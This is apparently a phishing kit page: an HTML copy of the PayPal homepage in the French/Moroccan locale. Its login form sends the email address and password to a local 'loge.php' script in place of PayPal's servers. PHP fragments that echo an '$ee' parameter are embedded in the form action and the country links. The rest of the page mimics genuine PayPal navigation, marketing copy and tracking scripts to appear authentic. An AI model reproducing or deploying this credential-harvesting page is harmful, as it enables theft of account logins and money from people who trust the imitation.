<!DOCTYPE html>
<html lang="fr" class="no-js">
    
    	
    	
   			<head>
    	
    
  	<!--
    	Script info: script: sparta, template:  , date: Jan 17, 2013 03:46:21 PDT, country: MA, language: FR
    	web version: 91.0-3204058
    	content version: major version: 1 minor version: 12
    	hostname : JyUfqzdnkhshv3r5uNnhkNj%2B4skmKHDUNW35IH8%2BhPwZX5Zv0O%2FrXIGT4JSYRmxppOaV3iZZxj0
    	rlogid : oBnUGTsTxlA9%2FZQCcyDheX%2BlyVVZsLpTgygcDt%2BVKx%2FPu%2FtKrJmWmPrwSHKY2%2BODnxGh2ZkN%2FNMYtw7ZPnphztLe3Yl00%2Fp4_1382d8c82fb
    -->
  	<title> Send Money, Pay Online or Set Up a Merchant Account - PayPal </title>
  	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
  	
  	
  	
  	
  	

	    <meta name="keywords" content="send money, pay online, merchant account " />

	    <meta name="description" content="PayPal is the faster, safer way to send money, make an online payment, receive money or set up a merchant account. " />

		

		    <link rel="canonical" href="https://www.paypal.com/ " />

		

    
  	<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
  	<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png" />
  	
  	
  		
  		
    		<link href="https://www.paypalobjects.com/eboxapps/css/02/1ad42f4ea71b15d52c89a0ab89a5af.css"  rel="stylesheet" type="text/css" />
    		<!--[if lt IE 10 & gte IE 8]>
    			<link href="https://www.paypalobjects.com/eboxapps/css/ea/47ed96cee495574037227b850af236.css"  rel="stylesheet" type="text/css" />
    		<![endif]-->
    		<!--[if IE 8]>
    			<link href="https://www.paypalobjects.com/eboxapps/css/0b/909e9f99f9deab4b1849fef1bb0616.css"  rel="stylesheet" type="text/css" />
    		<![endif]-->
    		<!--[if IE 7]>
    			<link href="https://www.paypalobjects.com/eboxapps/css/6c/8211141b60c9cd253143d247c0fca0.css"  rel="stylesheet" type="text/css" />
    		<![endif]-->
    		<!--[if IE 6]>
    			<link href="https://www.paypalobjects.com/eboxapps/css/e9/d105d20c0640c884ea04b8048ce2c6.css"  rel="stylesheet" type="text/css" />
    		<![endif]-->

  		
	 
  	
  	<style id="antiClickjack">
  		body {display: none !important;}
  	</style>
  	
  	<script>
		if (self === top) {
			var antiClickjack = document.getElementById("antiClickjack");
			antiClickjack.parentNode.removeChild(antiClickjack);
		} else {
			top.location = self.location;
		}
  	</script>
  	
  	<script src="https://www.paypalobjects.com/eboxapps/js/65/40db0c074183048f12bf5a3fc9c0d.js" type="text/javascript" ></script>
  	
	

        <style type="text/css">  

             

        </style>

    
    </head>    
    
    	
    		<body  id="personal" class="loggedOut">
    	
    	
    
	    <noscript>
	    	<p class="nonjsAlert" role="alert">
	    		NOTE: Many features on the PayPal Web site require Javascript and cookies.
	    	</p>
	    </noscript>

	    
	    	
	    		
			    	
			    	
			    		<div id="page" class="marketing-ce2">
			  	    
			    
	    	
	    	
	    
			
			








	
	

   












































<header class="gblHeader">
	<div class="outer" role="banner">
		<div class="inner">
			<nav class="site secondary" role="navigation">
				
				<ul>
					<li class="skip"><a href="#content">skip to content</a></li>
					
						
							<li class="current personal">

								
									
										<span class="scTrack:tab-personal"><a href="https://www.paypal.com/webapps/mpp/home">Personal</a></span>
									
									
								
							
						
						
							<li class="business">
								
									
										<span><a href="https://www.paypal.com/webapps/mpp/merchant/home">Business</a></span>
									
									
								</li>
						
					
				</ul>
			</nav>
			
				 
					
   					
   						
   					
   				

				
					
						
						
						

 

   











 



































 



	 

	 



<form method="post"
action="loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8<?php echo "&ee=$ee"; ?>"
name="login_form" class=" formSmall login">


	<input type="hidden" name="csrfModel.returnedCsrf" value="rFmTRnGITbJTFw-qIEI-K3j-dfekWkYLRSe0OFOAq5K9_g0Va2ruh2qOswWcxlwgMH4hWCh18DqfQjXjCyOXnLA8kdJzuItVK-uj_TyFB-WaMbn0" />
							<div class="multi lap">

<div class="textInput ">

	

	<label 
		
		 for="login_email" >
		Email address
		
	</label>
	
	<input type="email" 
		 id="login_email" 
		 name="login_email"
		
		required="required"
		
		
		
		
		 value=""
		
			
		
	/>

	<a 

	href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal" id="passwordRecovery1" 

	class="passwordRecovery scTrack:flyout-reset-email calloutLink" 

	aria-controls="passwordRecovery1Desc" aria-expanded="false" 

	data-shorttext="?" 

	data-longtext="forgot?">forgot?</a>

	<div id="passwordRecovery1Desc" class="calloutContent" aria-labelledby="passwordRecovery1" aria-hidden="true">
											<div class="close"><span id="calloutCloseBtn">Close</span></div>

											<p class="title">Forgot your email address?</p>
											<p>Enter up to 3 of your email addresses and we'll help you find your account.</p>
											<span class="button small secondary">
											<a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_account-recovery&amp;amp;from=PayPal">Get started</a>
											</span>
										</div>




</div>
								
<div class="textInput ">

	

	<label 
		
		 for="login_password" >
		Password
		
	</label>
	
	<input type="password" 
		 id="login_password" 
		 name="login_password"
		
		
		required="required"
		
		
		
		
		 autocomplete="off"
			
		
	/>



	<a 

	href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal" id="passwordRecovery2" 

	class="passwordRecovery scTrack:flyout-reset-password calloutLink" 

	aria-controls="passwordRecovery2Desc" aria-expanded="false" 

	data-shorttext="?" 

	data-longtext="forgot?">forgot?</a>

	<div id="passwordRecovery2Desc" class="calloutContent" aria-labelledby="passwordRecovery2" aria-hidden="true">
											<div class="close"><span id="calloutCloseBtn">Close</span></div>
											<p class="title">Forgot your password?</p>
											<p>Enter your email address and we'll help you reset your password.</p>
											<span class="button small secondary">
											<a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_account-recovery&amp;amp;from=PayPal">Get started</a>

											</span>
										</div>


</div>

<input type="submit" name="submit.x"  class="button secondary" value="Log in" />


									<span class="button primary">
									<a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_registration-run&amp;amp;from=PayPal">Sign up</a>

									</span>
							</div>
						



</form>  


						
					
					
				
			
		</div>
	</div>
	
	
		
			
			
				
 


















<div class="nav">
	<div class="navOut">
		<nav role="navigation">
			
			
	    	
	    		
				
					
				
				
			
			
			
			<ul>

				<li class="logo"><a href="#">
				<img src="css/img/logo_paypal_106x29.png" alt="PayPal home"></a></li>
				
					
					
					
					   
					   	
							<li class=" dropdown">
								<a href="https://www.paypal.com/webapps/mpp/how-paypal-works">Buy</a>
					      		
									<ul>
										
										
											<li ><a href="https://www.paypal.com/webapps/mpp/how-paypal-works">Overview</a> </li>
										
											<li ><a href="https://www.paypal.com/webapps/mpp/make-online-payments">Make a Payment...</a> </li>

										
											<li ><a href="https://www.paypal.com/webapps/mpp/buying-online">How to Purchase Online</a> </li>
										
											<li class="last"><a href="https://www.paypal.com/webapps/mpp/use-paypal-in-stores">How to Purchase in Stores</a> </li>
										
									</ul>
						    	
							</li>
							
						
					   	
							<li class=" dropdown">
								<a href="https://www.paypal.com/webapps/mpp/selling-with-paypal">Sell</a>

					      		
									<ul>
										
										
											<li ><a href="https://www.paypal.com/webapps/mpp/selling-with-paypal">Overview</a> </li>
										
											<li ><a href="https://www.paypal.com/webapps/mpp/requesting-payments">Request a Payment...</a> </li>
										
											<li ><a href="https://www.paypal.com/webapps/mpp/how-to-sell-online">How to Sell Online</a> </li>
										
											<li class="last"><a href="https://www.paypal.com/webapps/mpp/merchant">Go to Business Solutions</a> </li>

										
									</ul>
						    	
							</li>
							
						
					   	
							<li class=" dropdown">
								<a href="https://www.paypal.com/webapps/mpp/transfer-money-online">Transfer</a>
					      		
									<ul>
										
										
											<li ><a href="https://www.paypal.com/webapps/mpp/transfer-money-online">Overview</a> </li>
										
											<li class="last"><a href="https://www.paypal.com/webapps/mpp/send-money-online">Send Someone Money...</a> </li>

										
									</ul>
						    	
							</li>
							
						
					
					
				
			</ul>
			
				<div class="navUtilitiesSec"><a href="https://www.paypal.com/webapps/mpp/about-paypal-products">Explore</a></div>
			
			
		</nav>
	</div>
</div>
			
		
		
	
</header>

			
				
				
					<section id="content">
				
			
			
			<section id="headline">
				
				
					
					
				
				
				
					
					
						<h1 class="accessAid">
					
				 
				 Send Money, Pay Online or Set Up a Merchant Account - PayPal 
				</h1>
				
				
				
				
			</section>
			
			
				





























	



	





	



	

	

	

		

		<div id="messageBox" class="empty"></div>		

	




			
			
			
		    <section id="main">
				

         <div class="homepageHero"> <div class="blackDotsHeroTop"></div> <div class="nsb_16_8 clear"> <div class="one column"> <h1 class="pageHeadline2"> Redesigned with you in mind. </h1> <h2 class="pageSubHeadline"> When it came to updating our website, we brought in an expert: You. </h2> </div><div class="two column nogutter"> <div class="signUpContainer"> <h3 class="contentHeadline"> Explore the redesign </h3> <p class="contentParagraph"> Welcome to your new homepage </p> <form id="signUpForm" class="formMedium"> <a id="homepageSignUpCTA" href="#homepageOverlay" class="button homeCTABtn scTrack:button-tour"> Take the tour </a> </form> </div> </div> </div> <div class="blackDotsHeroBottom"></div> </div> <div class="threeColumnKicker gradientTop"> <div class="nsb_8_8_8"> <div class="one column nogutter kickerVerticalRule"> 

<img src="css/img/homepage-buy.png" alt="Buy into being safer" height="121" width="288"><div class="col1"> <h2 class="contentHeadline">Buy into being safer</h2> <p class="contentParagraph">No matter where you shop, we'll keep your financial information private and protected.</p> <a title="More about buying" class="scTrack:home:how-paypal-works" href="https://www.paypal.com/webapps/mpp/how-paypal-works">More about buying</a></div> </div><div class="two column nogutter kickerVerticalRule"> 
<img class="tracking" src="css/img/homepage-sell.png" alt="Sell in less steps " height="121" width="288"><div class="col2"> <h2 class="contentHeadline">Sell in fewer steps </h2> <p class="contentParagraph"> Gone are the days of waiting to get paid. Now you can request a secure payment in a few clicks. </p> <a title="More about selling" class="scTrack:home:selling-with-paypal" href="https://www.paypal.com/webapps/mpp/selling-with-paypal">More about selling</a></div> </div><div class="three column nogutter"> 

<img class="tracking" src="css/img/homepage-transfer.png" alt="Transfer money to friends" height="121" width="288"><div class="col3"> <h2 class="contentHeadline">Transfer money to friends</h2> <p class="contentParagraph"> Money is easier between friends when it's this simple to send them money. </p> <a title="More about transferring" class="scTrack:home:transfer-money-online" href="https://www.paypal.com/webapps/mpp/transfer-money-online">More about transferring</a></div> </div> </div> </div> <section aria-describedby="msg" aria-labelledby="hd" role="alertdialog" style="display: none;" id="homepageOverlay" class="ui-dialog-content ui-widget-content"> <div id="msg" class="nsb_6_6_6_6"> <div class="one column"> <div class="overlayTrayOuter"> <div class="badge-a"><h2>Navigate Easily</h2></div> <p class="overlayTrayParagraph"> We?ve really simplified our navigation, making it easier for you to find what you?re looking for and to explore some of the ways to use PayPal. </p> </div> </div><div class="two column"> <div class="overlayTrayOuter"> <div class="badge-b"><h2>Solve</h2></div> <p class="overlayTrayParagraph"> Common reference tools are down here on every page. Now you can spend less time looking for help and more time getting answers. </p> </div> </div><div class="three column"> <div class="overlayTrayOuter"> <div class="badge-cd"><h2>Login Quickly</h2></div> <p class="overlayTrayParagraph"> We?ve redesigned login and moved it to the top of every page so you can easily access your account no matter where you are on the website. </p> </div> </div><div class="four column nogutter"> <div class="overlayTrayOuter"> <div class="no-badge"><h2>Discover More</h2></div> <p class="overlayTrayParagraph"> We?re always creating new ways to use your PayPal account. Explore some innovations that could make your life a little easier. </p> </div> <div class="overlayCloseBtn"> <a tabindex="-1" href="#"class="white" title="Close" role="button">Close</a> </div> </div> </div> </section> 

   
			</section>

			
		</section>
		
		
			










	
		
		
		
		
	

	
	
	
		
		
		 
		
		
	
	
	
		
		
	

	
		<footer id="gblFooter" role="contentinfo">
						
			    <div class="utility">
				    <div class="footerNav">
					    <nav>
					    	
					    		<ul>
							  	  
								   		
											
							    		
							    		
							    	
									<li><a href="https://www.paypal.com/cgi-bin/helpweb?cmd=_help">Help</a></li><li><a href="https://www.paypal.com/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Contact us</a></li><li><a href="https://www.paypal.com/webapps/mpp/paypal-fees">Fees</a></li><li><a href="https://www.paypal.com/webapps/mpp/paypal-safety-and-security">Security</a></li><li><a href="https://www.paypal.com/webapps/mpp/what-is-paypal">Account features</a></li><li><a href="https://www.paypal.com/developer">Developers</a></li><li><a href="https://www.paypal-marketing.com/emarketing/partner/global/home.page">Partners</a></li>		
					    		</ul>

					    	
					    	
					    		

















   





























	





 



















<script type="text/javascript">var jsPath = "https://www.paypalobjects.com";</script>








					    	
					    </nav>
				    </div>
			    </div>

			    
			    <div class="footer">
			    	<div class="footerNav">
				    	<ul>
					    	
							    
							   		
										
						    		
						    		
						    	
								<li><a href="http://www.paypal-media.com/aboutus.cfm">About PayPal</a></li><li><a href="https://www.paypal.com/webapps/mpp/merchant/">Merchant services</a></li><li><a href="http://www.thepaypalblog.com">PayPal blog</a></li><li><a href="https://www.paypal-labs.com">PayPal Labs</a></li><li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=p/gen/jobs-outside">Jobs</a></li><li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside">Site map</a></li><li><a href="http://www.ebay.com">eBay</a></li>	
							
					    	
								<li id="siteFeedback">












<!-- Below values were from DataModel, we try to pass them as attribute if possible -->















<script type="text/javascript">

			var siteCatalystPageName="main:mktg:personal::home";

			var siteCatalystC7="";

			var siteCatalystAccountNumber="";

			var feedback_link='Site feedback';

			var isPaymentFlow = false;

			var isSiteRedirect =false;

			var languageCode='fr';

			var countryCode='MA';

			var serverName='www.paypal.com';

			var commentCardCmd='';

			var accountNumber='';

			var miniBrowser='';

			var sitefb_plus_icon='https://www.paypalobjects.com/webstatic/i/ex_ce2/icon/icon_feedback.gif';

			var rLogId = escape('oBnUGTsTxlA9%2FZQCcyDheX%2BlyVVZsLpTgygcDt%2BVKx%2FPu%2FtKrJmWmPrwSHKY2%2BODnxGh2ZkN%2FNMYtw7ZPnphztLe3Yl00%2Fp4_1382d8c82fb');

			var showSitefbIcon="false";

</script>


</li>

							
							
							<li id="countrySelector">
								<a href="#countryList" class="country selected scTrack:button-country">United States</a>
								<ul id="countryList" class="dropdown">
									<li class="country unitedStates"><a href="?cmd=_home&dispatch=5885d80a13c0db1f8e&l=EN<?php echo "&ee=$ee"; ?>">United States</a></li>
									<li class="country canada"><a href="?cmd=_home&dispatch=5885d80a13c0db1f8e&l=FR<?php echo "&ee=$ee"; ?>">Canada</a></li>
									<li class="country mexico"><a href="?cmd=_home&dispatch=5885d80a13c0db1f8e&l=ES<?php echo "&ee=$ee"; ?>">Mexico</a></li>
									<li class="country unitedKingdom"><a href="?cmd=_home&dispatch=5885d80a13c0db1f8e&l=EN<?php echo "&ee=$ee"; ?>">United Kingdom</a></li>
									<li class="country australia"><a href="?cmd=_home&dispatch=5885d80a13c0db1f8e&l=EN<?php echo "&ee=$ee"; ?>">Australia</a></li>
									<li class="last"><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_display-country-functionality-outside">See all countries</a></li>
								</ul>
								<div class="pointer"></div>
							</li>
				    		
				    	</ul>
						
					    	<p  class="copyright">Copyright &copy; 1999 - 2013 PayPal. All rights reserved.</p>

					    
					   	
							<ul class="legal">
						    	
							    	
							    		
											<li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy policy</a></li>
							    		
							    		
							    	
								
						    	
							    	
							    		
							    			<li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Legal agreements</a></li>
							    		
							    		
							    	
								
						    	
							</ul>
						
				    </div>
			    </div>
		    
		</footer>
	


		
	</div>

	
		<script src="https://www.paypalobjects.com/eboxapps/js/fa/4abadeffed5ad75c4e26165aac36b7.js" type="text/javascript" ></script>
	
    	
    	<script>
    		PAYPAL.util.ppobjectsPath = 'https://www.paypalobjects.com';			
    	</script>
		
		
	    	
		    	
		    	    	







 















































<script type="text/javascript">

	PAYPAL.tns.loginflow = '';

	PAYPAL.tns.flashLocation = 'https://www.paypalobjects.com/en_US/m/midOpt.swf';

</script>




		    	
		    	
		    		<script type="text/javascript">
		    			$(document).ready(function(){
		    				try {
		    					PAYPAL.bp.init("login_form","bp_mid");
		    					PAYPAL.ks.init("login_form","login_password","bp_ks1");
		    					PAYPAL.common.appendField("login_form", "bp_ks2");
		    					PAYPAL.common.appendField("login_form", "bp_ks3");
		    				} catch(err) {
		    				}
		    				Iconix.detect();
		    			});
		    		</script>
		    	
	    	
		
    	
    		<script src="https://www.paypalobjects.com/eboxapps/js/ee/4bd7c8832a426181cb6362769e7dbd.js" type="text/javascript" ></script>

    	
    	    	
    		



























<script type="text/javascript" src="https://www.paypalobjects.com/js/site_catalyst/pp_jscode_080706.js"></script>



<script type="text/javascript">



 /* SiteCatalyst Variables */



	s.pageName="main\x3Amktg\x3Apersonal\x3A\x3Ahome";



	s.channel="mktg";



	s.hier1="main_mktg_personal_";



	s.eVar31="main\x3Amktg\x3Apersonal\x3A\x3Ahome";



	s.eVar25="main\x3Amktg\x3Apersonal\x3A\x3Ahome\x3A\x3A\x3A";



	s.prop25="main\x3Amktg\x3Apersonal\x3A\x3Ahome\x3A\x3A\x3A";



	s.prop31="personal";



	s.prop1="home.jsp";



	s.prop20="Unknown";



	s.prop35="out";



	s.prop40="6577977fe6de7";



	s.prop30="mar";



	s.prop50="fr_MA";



	s.eVar61="7d010443693eec253a121e2aa2ba177c";



	s.eVar62=" ";



	s.prop62=" ";



	s.eVar66="\x7C\x7C";



	s.prop71="Sparta";



	s.prop8="unverified";



	s.prop9="unrestricted";



	s.prop22="6577977fe6de7";



	s.eVar34="bdaf3d1a35925";



	s.server="main";



	s.prop28="Unknown";



	s.prop36="https\x3A\x2F\x2Fwww.paypal.com\x2Fwebapps\x2Fmpp\x2Fhome";



   

 /************ DO NOT ALTER ANYTHING BELOW THIS LINE ! *************/ 

 function scOnload(){var s_code=s.t();if(s_code)document.write(s_code);}

 if(window.addEventListener){

	 window.addEventListener('load',scOnload,false);

 }

 else if(window.attachEvent){

	 window.attachEvent('onload', scOnload);

 };

 if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')

 </script> 

<noscript><img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" height="1" width="1" border="0"></noscript>




    	

    </body>
</html>

